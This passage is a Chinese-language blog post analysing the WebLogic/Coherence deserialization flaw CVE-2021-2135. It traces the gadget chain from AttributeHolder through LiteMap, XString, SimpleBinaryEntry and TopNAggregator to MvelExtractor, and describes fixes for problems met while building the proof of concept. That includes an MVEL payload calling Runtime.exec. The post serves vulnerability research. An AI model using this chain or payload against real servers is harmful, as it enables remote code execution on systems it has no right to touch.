class="keyword">instanceof</span> SerializerAware) &#123;</span><br><span class="line">            ((SerializerAware)value).setContextSerializer(ensureSerializer(loader));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到这里我们已经明白了<code>SimpleBinaryEntry</code>本质是Entry，有键值对，它的key即<code>m_key</code>属性、value即<code>m_value</code>属性，可以通过<code>getKey</code>和<code>getValue</code>设置，而<code>getKey</code>通过<code>ExternalizableHelper.fromBinary</code>来处理，<code>ExternalizableHelper.fromBinary</code>会根据<code>m_binKey</code>的数据类型的不同调用不同的反序列化方法进行读取，那么我们可以构造<code>m_binKey</code>达到我们命令执行的目的。</p>
<p>那么到这里我们怎么执行命令？参考之前的漏洞<a href="https://xz.aliyun.com/t/9550" target="_blank" rel="noopener">CVE-2020-14756</a>，可以考虑通过<code>com.tangosol.coherence.rest.util.extractor.MvelExtractor#extrace</code>执行命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ExternalizableHelper.readExternalizableLite()</span><br><span class="line">        TopNAggregator.PartialResult.readExternal()</span><br><span class="line">           TopNAggregator.PartialResult.add()</span><br><span class="line">             (AbstractExtractor)MvelExtractor.compare()</span><br><span class="line">               MvelExtractor.extract()</span><br><span class="line">                 MVEL.executeExpression()</span><br></pre></td></tr></table></figure>

<h4 id="3、TopNAggregator-PartialResult-readExternal-到命令执行"><a href="#3、TopNAggregator-PartialResult-readExternal-到命令执行" class="headerlink" title="3、TopNAggregator.PartialResult.readExternal()到命令执行"></a>3、TopNAggregator.PartialResult.readExternal()到命令执行</h4><p><code>TopNAggregator$PartialResult</code>实现了<code>ExternalizableLite</code>，其重写了<code>readExternal()</code>，我们可以通过<code>ExternalizableHelper.readExternalizableLite()</code>调用<code>TopNAggregator$PartialResult.readExternal</code>。</p>
<p><code>TopNAggregator$PartialResult.readExternal</code>主要读取和恢复<code>m_comparator</code>、<code>m_cMaxSize</code>、<code>m_map</code>属性的数据，其中调用了<code>Comparator.readObject</code>给属性<code>m_comparator</code>赋值，<code>comparator</code> 可控为 <code>MvelExtractor</code>，<code>m_map</code>是用<code>m_comparator</code>构造的<code>TreeMap</code>实例，并且通过<code>TopNAggregator$PartialResult.add</code>添加map的键值对。<code>TopNAggregator$PartialResult.add</code>会调用父类的add方法，最终通过map.put添加数据。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(DataInput in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 这里会调用Comparator.readObject给this.m_comparator赋值</span></span><br><span class="line">    <span class="keyword">this</span>.m_comparator = (Comparator)ExternalizableHelper.readObject(in);</span><br><span class="line">    <span class="keyword">this</span>.m_cMaxSize = ExternalizableHelper.readInt(in);</span><br><span class="line">    <span class="comment">//调用SortedBag.instantiateInternalMap</span></span><br><span class="line">    <span class="keyword">this</span>.m_map = <span class="keyword">this</span>.instantiateInternalMap(<span class="keyword">this</span>.m_comparator);</span><br><span class="line">    <span class="keyword">int</span> cElems = in.readInt();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cElems; ++i) &#123;</span><br><span class="line">        <span class="comment">// 调用add</span></span><br><span class="line">        <span class="keyword">this</span>.add(ExternalizableHelper.readObject(in));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.m_comparator_copy = <span class="keyword">this</span>.m_comparator;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E o)</span> </span>&#123;</span><br><span class="line">    NavigableMap map = <span class="keyword">this</span>.getInternalMap();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(!Base.equals(o, <span class="keyword">this</span>.unwrap(map.ceilingKey(o)))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (map.put(o, NO_VALUE) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// 调用map.put</span></span><br><span class="line">    map.put(<span class="keyword">this</span>.wrap(o), NO_VALUE);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>TreeMap.put()调用TreeMap.compare，最终会调用<code>comparator.compare((K)k1, (K)k2)</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    Entry&lt;K,V&gt; t = root;</span><br><span class="line">    <span class="keyword">if</span> (t == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 调用TreeMap.compare</span></span><br><span class="line">        compare(key, key); <span class="comment">// type (and possibly null) check</span></span><br><span class="line">		......</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> cmp;</span><br><span class="line">    Entry&lt;K,V&gt; parent;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Object k1, Object k2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> comparator==<span class="keyword">null</span> ? ((Comparable&lt;? <span class="keyword">super</span> K&gt;)k1).compareTo((K)k2) : comparator.compare((K)k1, (K)k2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果这里comparator是我们构造的MvelExtractor实例，MvelExtractor继承了AbstractExtractor，便可以调用<code>AbstractExtractor.compare</code>，从而调用<code>MvelExtractor.extract</code>达到命令执行的目的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># AbstractExtractor.compare</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Object o1, Object o2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> SafeComparator.compareSafe((Comparator)<span class="keyword">null</span>, <span class="keyword">this</span>.extract(o1), <span class="keyword">this</span>.extract(o2));</span><br><span class="line">&#125;</span><br><span class="line"># MvelExtractor.extract</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">extract</span><span class="params">(Object oTarget)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 调用MVEL.executeExpression执行命令</span></span><br><span class="line">	<span class="keyword">return</span> oTarget == <span class="keyword">null</span> ? <span class="keyword">null</span> : MVEL.executeExpression(<span class="keyword">this</span>.getCompiledExpression(), oTarget);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="三、反序列化载体分析："><a href="#三、反序列化载体分析：" class="headerlink" title="三、反序列化载体分析："></a>三、反序列化载体分析：</h3><h4 id="1、SimpleBinaryEntry-toString-的触发"><a href="#1、SimpleBinaryEntry-toString-的触发" class="headerlink" title="1、SimpleBinaryEntry.toString()的触发"></a>1、<code>SimpleBinaryEntry.toString()</code>的触发</h4><p>反序列化到<code>SimpleBinaryEntry.toString()</code>的触发，在<a href="https://mp.weixin.qq.com/s/eyZfAPivCkMbNCfukngpzg" target="_blank" rel="noopener">360CERT</a>中提到用<code>com.sun.org.apache.xpath.internal.objects.XString.equals()</code>。当<code>XString.equals()</code>的参数是SimpleBinaryEntry实例时，可以调用<code>SimpleBinaryEntry.toString</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">null</span> == obj2)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (obj2 <span class="keyword">instanceof</span> XNodeSet)</span><br><span class="line">    <span class="keyword">return</span> obj2.equals(<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(obj2 <span class="keyword">instanceof</span> XNumber)</span><br><span class="line">      <span class="keyword">return</span> obj2.equals(<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> str().equals(obj2.toString());<span class="comment">//，当传入的是simpleBinaryEntry，调用SimpleBinaryEntry.toString</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这时候需要触发<code>XString.equals(simpleBinaryEntry)</code>，我们可以考虑Map的put方法，因为Map一般在插入元素时做比较会调用equal，并且Map有个特别之处就是它一般不限制对象的类型，我们可以构造Map的Key或者Value为不同的对象如XString实例或者simpleBinaryEntry实例。</p>
<p><code>com.tangosol.util.LiteMap</code>继承了<code>com.tangosol.util.InflatableMap</code>，<code>InflatableMap.put</code>中当<code>InflatableMap.m_nImpl==1</code>，通过调用<code>Objects.equals(xString, simpleBinaryEntry)</code>可以调用<code>xString.equals(simpleBinaryEntry)</code>。所以LiteMap构造时传入的Map是<code>map&lt;simpleBinaryEntry, anyValue&gt;</code>和<code>map&lt;xString, anyValue&gt;</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(<span class="keyword">this</span>.m_nImpl) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">this</span>.m_nImpl = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">this</span>.m_oContents = <span class="keyword">this</span>.instantiateEntry(key, value);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        Entry&lt;K, V&gt; entry = (Entry)<span class="keyword">this</span>.m_oContents;</span><br><span class="line">        K entryKey = entry.getKey();</span><br><span class="line">        V prevValue = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// this.m_nImpl==1，调用Objects.equals(key, entryKey)，Objects.equals(xString, simpleBinaryEntry)</span></span><br><span class="line">        <span class="keyword">if</span> (Objects.equals(key, entryKey)) &#123;</span><br><span class="line">            prevValue = entry.getValue();</span><br><span class="line">            entry.setValue(value);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Entry&lt;K, V&gt;[] aEntry = <span class="keyword">new</span> Entry[<span class="number">8</span>];</span><br><span class="line">            aEntry[<span class="number">0</span>] = entry;</span><br><span class="line">            aEntry[<span class="number">1</span>] = <span class="keyword">this</span>.instantiateEntry(key, value);</span><br><span class="line">            <span class="keyword">this</span>.m_nImpl = <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">this</span>.m_oContents = aEntry;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> prevValue;</span><br><span class="line">	...</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object a, Object b)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 当a!=b，返回a.equals(b)，当a是xString，b是simpleBinaryEntry，a肯定不等于b，调用xString.equals(simpleBinaryEntry)</span></span><br><span class="line">    <span class="keyword">return</span> (a == b) || (a != <span class="keyword">null</span> &amp;&amp; a.equals(b));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2、反序列化入口"><a href="#2、反序列化入口" class="headerlink" title="2、反序列化入口"></a>2、反序列化入口</h4><p>那么接下来是找到反序列化入口，必然涉及到readObject或readExternal等类似读取的方法，如何在这些方法中调用<code>LiteMap.put</code>。<code>com.tangosol.util.processor.ConditionalPutAll</code>实现了<code>com.tangosol.io.ExternalizableLite</code>并重写了readExternal，在readExternal中构造了LiteMap实例，并且调用了<code>com.tangosol.util.ExternalizableHelper.readMap</code>将map的属性读取赋值给LiteMap实例。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(DataInput in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.m_filter = (Filter)ExternalizableHelper.readObject(in);</span><br><span class="line">    <span class="comment">// 创建LiteMap对象</span></span><br><span class="line">    Map map = <span class="keyword">this</span>.m_map = <span class="keyword">new</span> LiteMap();</span><br><span class="line">    <span class="comment">// 调用ExternalizableHelper.readMap处理map的反序列化</span></span><br><span class="line">    ExternalizableHelper.readMap(in, map, (ClassLoader)<span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>com.tangosol.util.ExternalizableHelper.readMap</code>中调用了<code>map.put</code>，假如oKey=xString、oVal=simpleBinaryEntry，刚好就能调用这里的map是LiteMap的实例，所以会调用<code>com.tangosol.util.InflatableMap.put(xString,simpleBinaryEntry)</code>，跟前面的链就连上了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">readMap</span><span class="params">(DataInput in, Map map, ClassLoader loader)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cEntries;</span><br><span class="line">    <span class="keyword">if</span> (in <span class="keyword">instanceof</span> PofInputStream) &#123;</span><br><span class="line">        PofInputStream inPof = (PofInputStream)in;</span><br><span class="line">        inPof.getPofReader().readMap(inPof.nextIndex(), map);</span><br><span class="line">        cEntries = map.size();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cEntries = in.readInt();</span><br><span class="line">		</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cEntries; ++i) &#123;</span><br><span class="line">            <span class="comment">// 读取map.key</span></span><br><span class="line">            Object oKey = readObject(in, loader);</span><br><span class="line">            <span class="comment">// 读取map.value</span></span><br><span class="line">            Object oVal = readObject(in, loader);</span><br><span class="line">            <span class="comment">// 调用map.put将key和value添加到map</span></span><br><span class="line">            map.put(oKey, oVal);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cEntries;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>刚开始的时候分析到这里我以为就完成了整个链，没想到忽略了一点-<strong>ConditionalPutAll只有<code>readExternal(DataInput in)</code>方法</strong>，没有实现Externalizable，不能传入<code>ObjectInput</code>，所以不但能作为入口。我们可以用CVE-2020-14756的<code>com.tangosol.coherence.servlet.AttributeHolder</code>作为入口，AttributeHolder实现了Externalizable，并且可以通过调用<code>readExternal(ObjectInput in)</code>调用<code>ExternalizableHelper.readObject(in)</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.readExternal((DataInput)in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(DataInput in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.m_sName = ExternalizableHelper.readUTF(in);</span><br><span class="line">    <span class="comment">//通过ExternalizableHelper.readObject可以进一步调用ExternalizableHelper.readObjectInternal</span></span><br><span class="line">    <span class="keyword">this</span>.m_oValue = ExternalizableHelper.readObject(in);</span><br><span class="line">    <span class="keyword">this</span>.m_fActivationListener = in.readBoolean();</span><br><span class="line">    <span class="keyword">this</span>.m_fBindingListener = in.readBoolean();</span><br><span class="line">    <span class="keyword">this</span>.m_fLocal = in.readBoolean();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="四、POC构造遇到的三个问题"><a href="#四、POC构造遇到的三个问题" class="headerlink" title="四、POC构造遇到的三个问题"></a>四、POC构造遇到的三个问题</h3><p>在构造POC时，遇到了三个分析了很久才解决的问题：</p>
<ul>
<li><p><code>SimpleBinaryEntry.m_binKey</code>的构造问题</p>
</li>
<li><p>不设置<code>SimpleBinaryEntry.m_serializer</code>导致序列化失败</p>
</li>
<li><p>ClassCastException报错问题导致序列化失败</p>
</li>
</ul>
<h4 id="1、SimpleBinaryEntry-m-binKey的构造问题"><a href="#1、SimpleBinaryEntry-m-binKey的构造问题" class="headerlink" title="1、SimpleBinaryEntry.m_binKey的构造问题"></a>1、<code>SimpleBinaryEntry.m_binKey</code>的构造问题</h4><p>最初构造m_binKey时，我用的是<code>TopNAggregator$PartialResult.writeExternal()</code>来写二进制数据，我忘了很重要的一点，<code>writeExternal()</code>一般序列化只会写一些属性，不涉及<code>TopNAggregator$PartialResult</code>自身的序列化，所以我调试到这里始终进不去<code>TopNAggregator$PartialResult.writeExternal()</code>，后来通过ExternalizableHelper解决了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExternalizableHelper.writeObject(dataOutputStream1, partialResult);</span><br></pre></td></tr></table></figure>

<h4 id="2、不设置SimpleBinaryEntry-m-serializer导致序列化失败"><a href="#2、不设置SimpleBinaryEntry-m-serializer导致序列化失败" class="headerlink" title="2、不设置SimpleBinaryEntry.m_serializer导致序列化失败"></a>2、不设置<code>SimpleBinaryEntry.m_serializer</code>导致序列化失败</h4><p>SimpleBinaryEntry在反序列化时会通过<code>if (value instanceof SerializerAware) {((SerializerAware)value).setContextSerializer(ensureSerializer(loader));}</code>给m_serializer赋值，所以虽然m_serializer时transient类型但是也被赋值了。但是在序列化时，我们需要用setContextSerializer给m_serializer赋值，如果没有设置m_serializer，会报错NullPointerException，因为SimpleBinaryEntry的key和value需要利用m_serializer来获取。调试的时候发现默认使用的是<code>com.tangosol.io.DefaultSerializer</code>，所以我在设置时也用了它。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Serializer m_serializer= <span class="keyword">new</span> DefaultSerializer(SimpleBinaryEntry<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>())</span>;</span><br><span class="line">simpleBinaryEntry.setContextSerializer(m_serializer);</span><br></pre></td></tr></table></figure>

<h4 id="3、ClassCastException报错问题"><a href="#3、ClassCastException报错问题" class="headerlink" title="3、ClassCastException报错问题"></a>3、ClassCastException报错问题</h4><p>在用y4er CVE-2020-14756的POC时也报了错：ClassCastException，但不影响执行命令，但是我的POC在序列化也执行了命令，所以才会报这个错并且导致程序执行不下去。<img src="/imgs/image-20210729204719132.png" alt="image-20210729204719132"></p>
<p>执行了<code>SafeComparator.compareSafe((Comparator)null, this.extract(o1), this.extract(o2))</code>，真正报错的地方在该方法的<code>((Comparable)o1).compareTo(o2)</code>。因为在传入参数时调用<code>MvelExtractor.extract(o1)</code>传值，extract通过<code>MVEL.executeExpression</code>返回结果，extract会把<code>MVEL.executeExpression</code>的结果返回作为o1，<strong>当<code>MVEL.executeExpression</code>执行结果是空默认会返回一个<code>java.lang.ProcessImpl</code>对象</strong>，<code>ProcessImpl</code>并不是<code>Comparable</code>的子类，所以将<code>ProcessImpl</code>转为<code>Comparable</code>会报一个转换错误。如何解决呢？既然执行的结果是空才会返回<code>ProcessImpl</code>对象，我只要返回一个实现了<code>Comparable</code>的类的实例就可以解决这个问题，这里我用了Integer。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MvelExtractor extractor1 = <span class="keyword">new</span> MvelExtractor(<span class="string">"java.lang.Runtime.getRuntime().exec(\"calc\");return new Integer(1);"</span>);</span><br></pre></td></tr></table></figure>

<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://xz.aliyun.com/t/9550" target="_blank" rel="noopener">https://xz.aliyun.com/t/9550</a><br><a href="https://y4er.com/post/weblogic-cve-2020-14756/" target="_blank" rel="noopener">https://y4er.com/post/weblogic-cve-2020-14756/</a><br><a href="https://mp.weixin.qq.com/s/eyZfAPivCkMbNCfukngpzg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/eyZfAPivCkMbNCfukngpzg</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/download/">Download</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、前言"><span class="toc-number">1.</span> <span class="toc-text">一、前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、命令执行载体分析："><span class="toc-number">2.</span> <span class="toc-text">二、命令执行载体分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、SimpleBinaryEntry的特性"><span class="toc-number">2.1.</span> <span class="toc-text">1、SimpleBinaryEntry的特性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、ExternalizableHelper-fromBinary"><span class="toc-number">2.2.</span> <span class="toc-text">2、ExternalizableHelper.fromBinary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、TopNAggregator-PartialResult-readExternal-到命令执行"><span class="toc-number">2.3.</span> <span class="toc-text">3、TopNAggregator.PartialResult.readExternal()到命令执行</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、反序列化载体分析："><span class="toc-number">3.</span> <span class="toc-text">三、反序列化载体分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、SimpleBinaryEntry-toString-的触发"><span class="toc-number">3.1.</span> <span class="toc-text">1、SimpleBinaryEntry.toString()的触发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、反序列化入口"><span class="toc-number">3.2.</span> <span class="toc-text">2、反序列化入口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四、POC构造遇到的三个问题"><span class="toc-number">4.</span> <span class="toc-text">四、POC构造遇到的三个问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、SimpleBinaryEntry-m-binKey的构造问题"><span class="toc-number">4.1.</span> <span class="toc-text">1、SimpleBinaryEntry.m_binKey的构造问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、不设置SimpleBinaryEntry-m-serializer导致序列化失败"><span class="toc-number">4.2.</span> <span class="toc-text">2、不设置SimpleBinaryEntry.m_serializer导致序列化失败</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、ClassCastException报错问题"><span class="toc-number">4.3.</span> <span class="toc-text">3、ClassCastException报错问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考链接："><span class="toc-number">5.</span> <span class="toc-text">参考链接：</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://r17a-17.github.io/2021/07/29/WebLogic-CVE-2021-2135%E5%88%86%E6%9E%90%E5%8F%8APOC%E6%9E%84%E9%80%A0%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://r17a-17.github.io/2021/07/29/WebLogic-CVE-2021-2135%E5%88%86%E6%9E%90%E5%8F%8APOC%E6%9E%84%E9%80%A0%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/&text=WebLogic CVE-2021-2135分析及POC构造遇到的问题" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://r17a-17.github.io/2021/07/29/WebLogic-CVE-2021-2135%E5%88%86%E6%9E%90%E5%8F%8APOC%E6%9E%84%E9%80%A0%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/&title=WebLogic CVE-2021-2135分析及POC构造遇到的问题" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://r17a-17.github.io/2021/07/29/WebLogic-CVE-2021-2135%E5%88%86%E6%9E%90%E5%8F%8APOC%E6%9E%84%E9%80%A0%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/&is_video=false&description=WebLogic CVE-2021-2135分析及POC构造遇到的问题" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=WebLogic CVE-2021-2135分析及POC构造遇到的问题&body=Check out this article: https://r17a-17.github.io/2021/07/29/WebLogic-CVE-2021-2135%E5%88%86%E6%9E%90%E5%8F%8APOC%E6%9E%84%E9%80%A0%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
